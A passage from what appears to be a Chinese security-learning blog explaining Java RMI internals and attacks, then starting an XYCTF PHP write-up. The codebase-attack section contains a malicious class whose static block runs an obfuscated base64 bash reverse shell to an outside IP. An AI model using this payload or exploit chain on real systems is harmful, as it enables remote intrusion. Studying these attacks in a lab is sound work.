class="string">&quot;Hello&quot;</span>+c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="comment">//完成接口</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Registry.java</span></span><br><span class="line"><span class="keyword">package</span> org.LSE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Registry</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1007</span>);</span><br><span class="line">        <span class="type">Server</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Server</span>();</span><br><span class="line">        Server.LSEHello hello=ser.<span class="keyword">new</span> <span class="title class_">LSEHello</span>();</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1007/Hello&quot;</span>, hello);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">start</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Registry</span>();</span><br><span class="line">        start.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>Clinet端需要一个和Server端一模一样的接口<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// RMIHello.java</span></span><br><span class="line"><span class="keyword">package</span> org.LSE;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Hello</span><span class="params">(String c)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Client.java</span></span><br><span class="line"><span class="keyword">package</span> org.LSE;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1007);</span></span><br><span class="line">        <span class="comment">// 查找远程对象</span></span><br><span class="line">        <span class="type">RMIHello</span> <span class="variable">hello</span> <span class="operator">=</span> (RMIHello) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1007/Hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用远程方法</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> hello.Hello(<span class="string">&quot;World&quot;</span>);</span><br><span class="line">        System.out.println(response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>注意其接口的包名也需与Server接口包名相同<br>当然生成挂载类和调用类的方法很多如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Sever</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">registry</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Registry r=LocateRegistry.createRegistry(<span class="number">1007</span>);</span><br><span class="line">        <span class="type">Server</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Server</span>();</span><br><span class="line">        Server.LSEHello hello=ser.<span class="keyword">new</span> <span class="title class_">LSEHello</span>();</span><br><span class="line">        r.rebind(<span class="string">&quot;rmi://127.0.0.1:1007/Hello&quot;</span>, hello);</span><br><span class="line">        <span class="comment">//Naming.rebind(&quot;rmi://127.0.0.1:1007/Hello&quot;, hello);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">registry</span> <span class="variable">start</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">registry</span>();</span><br><span class="line">        start.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Client</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1007</span>);</span><br><span class="line">        <span class="type">RMIHello</span> <span class="variable">hello</span> <span class="operator">=</span> (RMIHello) r.lookup(<span class="string">&quot;rmi://127.0.0.1:1007/Hello&quot;</span>);</span><br><span class="line">        <span class="comment">// 查找远程对象</span></span><br><span class="line">        <span class="comment">//RMIHello hello = (RMIHello) Naming.lookup(&quot;rmi://127.0.0.1:1007/Hello&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用远程方法</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> hello.Hello(<span class="string">&quot;World&quot;</span>);</span><br><span class="line">        System.out.println(response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>要想分析RMI的过程我们需要对这个通信过程进行抓包。<br>抓到包后我们发现其进行了如下图的两次tcp的握手<br><img src="/2024/09/07/RMI/5.png" class="" title="alt text"><br>第一次的tcp我们可以看出来是客户端向远端的1007端口即registry发送请求，之后远端放回响应。</p>
<p>第二次tcp握手我们会发现其向远端的14956端口发送了请求，那么现在就有一个问题了，客户端是怎么知道14956这个端口的。我们查看一下流量会发现其在第一次握手后客户端向远端发送了一个”call”消息，而远端返回了一个”ReturnData”返回的DATA响应包如下<br><img src="/2024/09/07/RMI/6.png" class="" title="alt text"><br>会发现其是一个序列化后的响应包而在ip后的\x00\x00\x3a\x6c其实是端口14956的网络序列<br><img src="/2024/09/07/RMI/7.png" class="" title="alt text"></p>
<p>这个的整体过程就是，客户端先与远端的Registry进行连接而后向Registry发送请求寻找name为Hello这个对象，Registry返回一个DATA这个DATA就是这个Hello这个远程对象的一个引用(stub)，客户端反序列化后发现该数据是远程对象的存根，该存根对象内存储的远程对象的ip和端口等，于是客户端再次与远程对象连接来的调用远程对象Hello，即对象的调用是发生在第二次tcp连接的。<br>并且其实远程方法其实是在RMI Server上执行的</p>
<h1 id="RMI的一些攻击手段"><a href="#RMI的一些攻击手段" class="headerlink" title="RMI的一些攻击手段"></a>RMI的一些攻击手段</h1><h2 id="RMI服务器挂载了一些危险方法"><a href="#RMI服务器挂载了一些危险方法" class="headerlink" title="RMI服务器挂载了一些危险方法"></a>RMI服务器挂载了一些危险方法</h2><p>首先我们可以把Registry想象成一个管理远程对象的一个后台，即我们知道了Registry就可以对远程对象进行一些调用，但是很可惜我们无法修改Registry上的类，java在我们使用Naming.rebind的时候会判断我们是否是localhost的只有localhost才可以修改Registry上挂载的类。<br>我们虽然无法修改类，但却可以调用类，使用Naming.list来查看其是否存在危险类，若存在我们就可以直接调用，而调用的远程对象其实是在远端服务器上运行的。</p>
<p>我们在Registry加上一个Runtime的恶意类<br><img src="/2024/09/07/RMI/9.png" class="" title="alt text"><br><img src="/2024/09/07/RMI/8.png" class="" title="alt text"><br>用list可以看到这个Run类<br>在虚拟机中运行<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.getRegistry(<span class="string">&quot;192.168.20.1&quot;</span>,<span class="number">1007</span>);</span><br><span class="line">        runtime Run=(runtime) Naming.lookup(<span class="string">&quot;rmi://192.168.20.1:1007/Run&quot;</span>);</span><br><span class="line">        Run.run(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>会发现弹出计算机<br><img src="/2024/09/07/RMI/11.png" class="" title="alt text"></p>
<h2 id="使用codebase攻击"><a href="#使用codebase攻击" class="headerlink" title="使用codebase攻击"></a>使用codebase攻击</h2><p>在RMI中存在这远程加载类的场景，其中涉及到了codebase。<br>当服务器安装并配置了SecurityManager时我们就可以使用codebase<br>codebase是一个url地址，该地址包含了一个java的类文件，当codebase传到Registry服务器时，服务器会先搜索看自己是否有这个类文件，如果没有就调用这个远程的codebase的类文件。<br>那么只要我们能够操控codebase让其加载恶意类文件不就可以命令执行了。</p>
<p>当然了像这种明显的漏洞官方自然是知道的，于是官方在java版本7u21、6u45之后把java.rmi.server.useCodebaseOnly的默认配置由改为了true。而当java.rmi.server.useCodebaseOnly=true时远程的RMI服务之后执行已经预设定好的codebase的类，若codebase的类不是预设的就会报错。</p>
<p>而java.rmi.server.useCodebaseOnly=false时就存在这个漏洞。<br>即当java版本低于7u21、6u45或者java.rmi.server.useCodebaseOnly=false时我们可以尝试使用codebase进行攻击</p>
<p>代码如下<br>首先是Server<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//RemoteRMIServer.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;setup SecurityManager&quot;</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">SecurityManager</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Calc</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calc</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://192.168.20.1:1099/refObj&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RemoteRMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Calc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">ICalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Integer param : params) &#123;</span><br><span class="line">            sum += param;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ICalc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用List类来坐参数是因为我们如果想要服务端调用我们codebase的恶意类首先要传输给服务端这个恶意类的类,而我们像传给其信息只能在接口参数动手脚,但是接口的参数类型是写死的,但是类可以继承于Arraylist这个类,这导致我们可以将恶意类定义为List类型如何传给服务端,从而让服务端去codebase查找恶意类</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Server.policy</span></span><br><span class="line">grant &#123;</span><br><span class="line">permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//这个文件是为了让客户端访问其时有最大限度的权限,这样才可以让其访问codebase指向的url</span></span><br></pre></td></tr></table></figure><br>Cient.java<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//Cient.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Run</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">r</span> <span class="operator">=</span> (ICalc) Naming.lookup(<span class="string">&quot;rmi://192.168.20.128:1099/refObj&quot;</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">Run</span>();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Client</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>一开始看p牛文章的时候我发现其是使用如上的Cient端来像Server端发送请求的,那么这时Server需要到codebase寻找的恶意类Run就是<code>Client$Run.class</code>那么我们就需要在Client里写一个内置类在内置类里写一个static来让其在被加载时会被调用如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Run</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMjMwLjM4LjE1OS83Nzc3IDA+JjEnCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/09/07/RMI/15.png" class="" title="alt text"><br>我们可以发现其在jdk16才支持于类内定义Static。当然只要升级运行jDK版本即可。</p>
<p>但是有点小小的麻烦，于是我发现可以只要在Client外定义一个继承了List的Run类然后直接在Cilen里实例化后传参即可如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Client.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">r</span> <span class="operator">=</span> (ICalc) Naming.lookup(<span class="string">&quot;rmi://192.168.20.128:1099/refObj&quot;</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">Run</span>();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Client</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Run.java</span></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Run</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC4xNTkvNzc3NyAwPiYxJw==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;Run&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>Run.java于Cilent放在同一个包下，而Run.java又是恶意类的java源码。<br>我们使用如下代码启动Server类<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=192.168.135.142 -Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.security.policy=client.policy RemoteRMIServer</span><br></pre></td></tr></table></figure><br>Client启动<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.rmi.server.codebase=http://example.com/ Client</span><br></pre></td></tr></table></figure><br><code>http://example.com/</code>为我们放置恶意类的地方。我这里用的时python的http服务<br>在我们启动了Cient请求Server时我们会发现其因为服务器内没有Run.class这个类所以像codebase请求了Run.java<br><img src="/2024/09/07/RMI/13.png" class="" title="alt text"><br>之后成功反弹了shell即加载了Run.class<br><img src="/2024/09/07/RMI/14.png" class="" title="alt text"></p>
<h1 id="分析一下RMI在codebase攻击时的流量"><a href="#分析一下RMI在codebase攻击时的流量" class="headerlink" title="分析一下RMI在codebase攻击时的流量"></a>分析一下RMI在codebase攻击时的流量</h1><p>我们来看需要RMI_cdebase攻击的流量是什么样的，我们可以用流量来尝试分析codebase是在哪个点被加载活传入的<br><img src="/2024/09/07/RMI/17.png" class="" title="alt text"><br>我们可以看到Call消息的包里有一个java序列化的消息，我们可以使用一个工具来将将序列化内容的16进制字符进行反序列查看内容。<a href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper</a><br><img src="/2024/09/07/RMI/18.png" class="" title="alt text"><br>我们可以看到这个Call消息<br>想要看懂他我们需要配合文档来查看<a href="https://doc.qzxdp.cn/jdk/20/zh/specs/serialization/protocol.html">Java 对象序列化规范</a><br>当然对我来说，光看这个文档我肯定是看不懂的，所以我还配合了ai让我理解这些都是啥</p>
<p>总的来说这些流数据的组成其实就是两个大部<code>流头部(STREAM_MAGIC 和 STREAM_VERSION)</code>和<code>流内容(Contents)</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 流头部</span><br><span class="line">STREAM_MAGIC 和 STREAM_VERSION：流的魔数和版本信息，分别是 0xaced 和 0x05。它们总是出现在序列化流的开始位置，用来标识这是一个Java对象流。</span><br><span class="line">2. 流内容（contents）</span><br><span class="line">流内容可以包含多个对象或块数据，结构上由不同的标记（标识符）来表示对象、数组、字符串、类描述符等。</span><br><span class="line"></span><br><span class="line">content：表示序列化流的实际内容，可以是一个对象（object）或块数据（blockdata）。</span><br><span class="line">3. 对象（object）</span><br><span class="line">newObject、newClass、newArray、newString、newEnum 等：表示序列化中的新对象类型。每种类型都有特定的标识符（例如 TC_OBJECT、TC_CLASS）。</span><br><span class="line"></span><br><span class="line">prevObject、nullReference、exception 等：表示引用类型的对象，例如之前出现的对象（prevObject），null引用（nullReference），或者一个异常对象（exception）。</span><br><span class="line"></span><br><span class="line">4. 类描述符（classDesc 和 classDescInfo）</span><br><span class="line">类描述符用于描述序列化对象的类信息，包括类名、序列化版本UID（serialVersionUID）、字段信息和父类描述符等。</span><br><span class="line"></span><br><span class="line">newClassDesc、TC_CLASSDESC：新类描述符的定义，包括类名、序列化版本UID等信息。</span><br><span class="line"></span><br><span class="line">fields：字段信息描述符，描述对象的各个字段类型及名称。</span><br><span class="line"></span><br><span class="line">5. 标记和常量</span><br><span class="line">这些是流中的关键标记，用于标识序列化内容的类型：</span><br><span class="line"></span><br><span class="line">TC_NULL、TC_REFERENCE、TC_CLASSDESC、TC_OBJECT、TC_STRING 等：表示不同类型的数据或对象。</span><br></pre></td></tr></table></figure><br>上面的流数据涉及到了如下的语法<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">stream:</span><br><span class="line"> magic version contents</span><br><span class="line"></span><br><span class="line">contents:</span><br><span class="line"> content</span><br><span class="line"> contents content</span><br><span class="line"></span><br><span class="line">content:</span><br><span class="line"> object</span><br><span class="line"> blockdata</span><br><span class="line"></span><br><span class="line">object:</span><br><span class="line"> newObject</span><br><span class="line"> newClass</span><br><span class="line"> newArray</span><br><span class="line"> newString</span><br><span class="line"> newEnum</span><br><span class="line"> newClassDesc</span><br><span class="line"> prevObject</span><br><span class="line"> nullReference</span><br><span class="line"> exception</span><br><span class="line"> TC_RESET</span><br><span class="line"></span><br><span class="line">blockdata:</span><br><span class="line"> blockdatashort</span><br><span class="line"> blockdatalong</span><br><span class="line"></span><br><span class="line">blockdatashort:</span><br><span class="line"> TC_BLOCKDATA (unsigned <span class="type">byte</span>)&lt;size&gt; (<span class="type">byte</span>)[size]</span><br><span class="line">newString:</span><br><span class="line"> TC_STRING <span class="title function_">newHandle</span> <span class="params">(utf)</span></span><br><span class="line"> TC_LONGSTRING <span class="title function_">newHandle</span> <span class="params">(<span class="type">long</span>-utf)</span></span><br></pre></td></tr></table></figure><br>我们虽然无法解读出块数据传了什么，但是我们可以看出来其传了一个String的类内容为refObj，其实也就是传了个字符串过去，这个传过去来请求Registry</p>
<p>查看过几个反序列流量包后发现了如下流量包<br><img src="/2024/09/07/RMI/19.png" class="" title="alt text"><br>我们可以看到我们发现的codebase数据，其出现在了classAnnotations即其是通过classAnnotations来传递的，即我们只要修改classAnnotations就可以控制codebase</p>
<h2 id="classAnnotations"><a href="#classAnnotations" class="headerlink" title="classAnnotations"></a>classAnnotations</h2><p>classAnnotations其实是我们在java序列号时用到的一个类ObjectOutputStream，这个类内部存在一个方法叫annotateClass当ObjectOutputStream的子类需要向序列化文件写入一些内容时会重写这个方法，而classAnnotations其实就是annotateClass写入的内容。<br>在RMi中远程传输序列号是由ObjectOutputStream来进行的，而这个类也理所当然是ObjectOutputStream的子类。传入codebase其实就是调用annotateClass来重写添加序列号内容。</p>
]]></content>
      <categories>
        <category>java</category>
        <category>RMI</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>XYCTF web</title>
    <url>/2024/04/25/XYCTF-web/</url>
    <content><![CDATA[<h1 id="浅浅写一下wp吧，web差两题没有写出来，主要是因为，赛事时间太长，还要大二大三的老登太多了，没有拿奖的希望，就懒的打了。下面就写一下有些难度的吧，简单题就不写了。"><a href="#浅浅写一下wp吧，web差两题没有写出来，主要是因为，赛事时间太长，还要大二大三的老登太多了，没有拿奖的希望，就懒的打了。下面就写一下有些难度的吧，简单题就不写了。" class="headerlink" title="浅浅写一下wp吧，web差两题没有写出来，主要是因为，赛事时间太长，还要大二大三的老登太多了，没有拿奖的希望，就懒的打了。下面就写一下有些难度的吧，简单题就不写了。"></a>浅浅写一下wp吧，web差两题没有写出来，主要是因为，赛事时间太长，还要大二大三的老登太多了，没有拿奖的希望，就懒的打了。下面就写一下有些难度的吧，简单题就不写了。</h1><h1 id="ezPOP"><a href="#ezPOP" class="headerlink" title="ezPOP"></a>ezPOP</h1><p>这题难度不是特别高但是又两个算新又不是特别新的知识点<br>第一个知识点就是</p>
<h2 id="GC回收机制触发destruct"><a href="#GC回收机制触发destruct" class="headerlink" title="GC回收机制触发destruct"></a>GC回收机制触发<strong>destruct</strong></h2><p>首先我们来聊聊什么是GC回收机制。GC回收是一种销毁机制，又称垃圾回收机制。<br>在PHP中，使用引用计数和回收周期来自动管理内存对象的，当一个变量被设置为NULL，或者没有任何指针指向<br>时，它就会被变成垃圾，被GC机制自动回收掉<br>那么这里的话我们就可以理解为，当一个对象没有被引用时，就会被GC机制回收，在回收的过程中，它会自动触发_destruct方法，而这也就是我们绕过抛出异常的关键点。</p>
<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$B</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发回收&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$A</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;抛出异常&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>上面的代码无法触发__destruct()原因是代码再结束前被直接抛出了异常导致实例无法正确被销毁触发魔术方法。</p>
